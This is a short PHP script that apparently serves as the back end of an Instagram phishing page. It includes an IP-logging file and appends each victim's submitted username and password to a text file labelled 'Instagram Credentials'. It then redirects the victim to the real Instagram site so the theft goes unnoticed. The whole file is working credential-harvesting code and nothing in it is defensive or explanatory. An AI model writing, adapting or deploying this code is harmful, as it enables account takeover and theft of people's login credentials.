<?php
include 'ip.php';

file_put_contents("usernames.txt", "Instagram Credentials:: [EMAIL]: " . $_POST['username'] . " [PASS]: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location:https://www.instagram.com');
exit();

